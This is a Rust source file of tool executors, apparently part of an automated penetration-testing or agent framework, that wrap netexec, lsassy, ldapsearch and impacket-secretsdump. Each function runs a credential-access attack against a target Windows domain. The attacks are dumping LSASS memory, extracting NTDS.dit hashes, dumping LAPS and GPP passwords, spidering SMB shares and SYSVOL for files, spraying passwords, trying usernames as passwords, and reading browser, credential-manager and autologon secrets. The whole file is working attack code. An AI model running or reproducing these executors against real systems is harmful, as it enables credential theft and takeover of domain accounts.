//! Miscellaneous credential access tool executors (lsassy, domain admin
//! checker, GPP, SYSVOL, LAPS, LDAP descriptions, SMB spider, NTDS,
//! password policy, password spray, username-as-password, credman, autologon).

use anyhow::Result;
use serde_json::Value;

use crate::args::{optional_i64, optional_str, required_str};
use crate::credentials;
use crate::executor::CommandBuilder;
use crate::ToolOutput;

/// Dump LSASS credentials remotely via `lsassy`.
pub async fn lsassy(args: &Value) -> Result<ToolOutput> {
    let domain = required_str(args, "domain")?;
    let username = required_str(args, "username")?;
    let password = optional_str(args, "password");
    let hash = optional_str(args, "hash");
    let target = required_str(args, "target")?;
    let method = optional_str(args, "method");

    let mut cmd = CommandBuilder::new("lsassy")
        .flag("-d", domain)
        .flag("-u", username);

    if let Some(h) = hash {
        let h = if h.contains(':') {
            h.to_string()
        } else {
            format!(":{h}")
        };
        cmd = cmd.flag("-H", h);
    } else if let Some(p) = password {
        cmd = cmd.flag("-p", p);
    }

    cmd = cmd.arg(target);
    cmd = cmd.flag_opt("-m", method);

    cmd.timeout_secs(120).execute().await
}

/// Check for admin access on targets via `netexec smb --admin-status`.
pub async fn domain_admin_checker(args: &Value) -> Result<ToolOutput> {
    let targets = required_str(args, "targets")?;
    let username = optional_str(args, "username");
    let password = optional_str(args, "password");
    let hash = optional_str(args, "hash");
    let domain = optional_str(args, "domain");

    let cred_args = credentials::netexec_creds(username, password, hash, domain);

    CommandBuilder::new("netexec")
        .arg("smb")
        .arg(targets)
        .args(cred_args)
        .arg("--admin-status")
        .timeout_secs(120)
        .execute()
        .await
}

/// Search for Group Policy Preferences passwords via `netexec smb -M gpp_autologin`.
pub async fn gpp_password_finder(args: &Value) -> Result<ToolOutput> {
    let target = required_str(args, "target")?;
    let username = required_str(args, "username")?;
    let password = required_str(args, "password")?;
    let domain = required_str(args, "domain")?;

    let cred_args = credentials::netexec_creds(Some(username), Some(password), None, Some(domain));

    CommandBuilder::new("netexec")
        .arg("smb")
        .arg(target)
        .args(cred_args)
        .flag("-M", "gpp_autologin")
        .timeout_secs(120)
        .execute()
        .await
}

/// Spider SYSVOL for scripts and config files via `netexec smb -M spider_plus`.
pub async fn sysvol_script_search(args: &Value) -> Result<ToolOutput> {
    let target = required_str(args, "target")?;
    let username = required_str(args, "username")?;
    let password = required_str(args, "password")?;
    let domain = required_str(args, "domain")?;

    let cred_args = credentials::netexec_creds(Some(username), Some(password), None, Some(domain));

    CommandBuilder::new("netexec")
        .arg("smb")
        .arg(target)
        .args(cred_args)
        .flag("-M", "spider_plus")
        .flag("-o", "DOWNLOAD_FLAG=True MAX_FILE_SIZE=102400")
        .timeout_secs(300)
        .execute()
        .await
}

/// Dump LAPS passwords via `netexec ldap -M laps`.
pub async fn laps_dump(args: &Value) -> Result<ToolOutput> {
    let target = required_str(args, "target")?;
    let username = required_str(args, "username")?;
    let password = required_str(args, "password")?;
    let domain = required_str(args, "domain")?;

    let cred_args = credentials::netexec_creds(Some(username), Some(password), None, Some(domain));

    CommandBuilder::new("netexec")
        .arg("ldap")
        .arg(target)
        .args(cred_args)
        .flag("-M", "laps")
        .timeout_secs(120)
        .execute()
        .await
}

/// Search for user descriptions containing credentials via `ldapsearch`.
pub async fn ldap_search_descriptions(args: &Value) -> Result<ToolOutput> {
    let target = required_str(args, "target")?;
    let username = required_str(args, "username")?;
    let password = required_str(args, "password")?;
    let domain = required_str(args, "domain")?;
    let base_dn = optional_str(args, "base_dn");

    // Build base DN from domain if not explicitly provided.
    let computed_base_dn = match base_dn {
        Some(dn) => dn.to_string(),
        None => domain
            .split('.')
            .map(|part| format!("DC={part}"))
            .collect::<Vec<_>>()
            .join(","),
    };

    let bind_dn = format!("{username}@{domain}");
    let ldap_uri = format!("ldap://{target}");

    CommandBuilder::new("ldapsearch")
        .arg("-x")
        .flag("-H", &ldap_uri)
        .flag("-D", &bind_dn)
        .flag("-w", password)
        .flag("-b", &computed_base_dn)
        .arg("(&(objectClass=user)(description=*))")
        .arg("sAMAccountName")
        .arg("description")
        .arg("userPrincipalName")
        .timeout_secs(120)
        .execute()
        .await
}

/// Spider SMB shares for interesting files via `netexec smb -M spider_plus`.
pub async fn smbclient_spider(args: &Value) -> Result<ToolOutput> {
    let target = required_str(args, "target")?;
    let username = required_str(args, "username")?;
    let password = required_str(args, "password")?;
    let domain = required_str(args, "domain")?;
    let pattern = optional_str(args, "pattern");
    let depth = optional_i64(args, "depth");

    let cred_args = credentials::netexec_creds(Some(username), Some(password), None, Some(domain));

    let mut opts = "DOWNLOAD_FLAG=True MAX_FILE_SIZE=102400".to_string();
    if let Some(p) = pattern {
        opts.push_str(&format!(" PATTERN={p}"));
    }
    if let Some(d) = depth {
        opts.push_str(&format!(" DEPTH={d}"));
    }

    CommandBuilder::new("netexec")
        .arg("smb")
        .arg(target)
        .args(cred_args)
        .flag("-M", "spider_plus")
        .flag("-o", &opts)
        .timeout_secs(300)
        .execute()
        .await
}

/// Extract NTDS.dit secrets via `impacket-secretsdump -ntds drsuapi`.
pub async fn ntds_dit_extract(args: &Value) -> Result<ToolOutput> {
    let domain = optional_str(args, "domain");
    let username = required_str(args, "username")?;
    let password = optional_str(args, "password");
    let hash = optional_str(args, "hash");
    let target = required_str(args, "target")?;

    let (auth_string, extra_args) =
        credentials::impacket_auth(domain, username, password, hash, target);

    CommandBuilder::new("impacket-secretsdump")
        .arg("-ntds")
        .arg("drsuapi")
        .args(extra_args)
        .arg(&auth_string)
        .timeout_secs(180)
        .execute()
        .await
}

/// Retrieve the domain password policy via `netexec smb --pass-pol`.
pub async fn password_policy(args: &Value) -> Result<ToolOutput> {
    let target = required_str(args, "target")?;
    let username = required_str(args, "username")?;
    let password = required_str(args, "password")?;
    let domain = required_str(args, "domain")?;

    let cred_args = credentials::netexec_creds(Some(username), Some(password), None, Some(domain));

    CommandBuilder::new("netexec")
        .arg("smb")
        .arg(target)
        .args(cred_args)
        .arg("--pass-pol")
        .timeout_secs(120)
        .execute()
        .await
}

/// Spray a single password across a user list via `netexec smb`.
pub async fn password_spray(args: &Value) -> Result<ToolOutput> {
    let target = required_str(args, "target")?;
    let users_file = required_str(args, "users_file")?;
    let password = required_str(args, "password")?;
    let domain = required_str(args, "domain")?;
    let delay_seconds = optional_i64(args, "delay_seconds");

    let cred_args = credentials::netexec_creds(None, Some(password), None, Some(domain));

    CommandBuilder::new("netexec")
        .arg("smb")
        .arg(target)
        .flag("-u", users_file)
        .args(cred_args)
        .arg("--continue-on-success")
        .flag_opt("--jitter", delay_seconds.map(|d| d.to_string()))
        .timeout_secs(300)
        .execute()
        .await
}

/// Test each username as its own password via `netexec smb --no-bruteforce`.
pub async fn username_as_password(args: &Value) -> Result<ToolOutput> {
    let target = required_str(args, "target")?;
    let users_file = required_str(args, "users_file")?;
    let domain = required_str(args, "domain")?;

    CommandBuilder::new("netexec")
        .arg("smb")
        .arg(target)
        .flag("-u", users_file)
        .flag("-p", users_file)
        .flag("-d", domain)
        .arg("--no-bruteforce")
        .arg("--continue-on-success")
        .timeout_secs(300)
        .execute()
        .await
}

/// Enumerate Credential Manager / Chrome entries via `netexec smb -M enum_chrome`.
pub async fn check_credman_entries(args: &Value) -> Result<ToolOutput> {
    let target = required_str(args, "target")?;
    let username = required_str(args, "username")?;
    let password = required_str(args, "password")?;
    let domain = required_str(args, "domain")?;

    let cred_args = credentials::netexec_creds(Some(username), Some(password), None, Some(domain));

    CommandBuilder::new("netexec")
        .arg("smb")
        .arg(target)
        .args(cred_args)
        .flag("-M", "enum_chrome")
        .timeout_secs(120)
        .execute()
        .await
}

/// Query Winlogon autologon registry values via `netexec smb -M reg-query`.
pub async fn check_autologon_registry(args: &Value) -> Result<ToolOutput> {
    let target = required_str(args, "target")?;
    let username = required_str(args, "username")?;
    let password = required_str(args, "password")?;
    let domain = required_str(args, "domain")?;

    let cred_args = credentials::netexec_creds(Some(username), Some(password), None, Some(domain));

    CommandBuilder::new("netexec")
        .arg("smb")
        .arg(target)
        .args(cred_args)
        .flag("-M", "reg-query")
        .flag(
            "-o",
            "QUERY=HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon",
        )
        .timeout_secs(120)
        .execute()
        .await
}
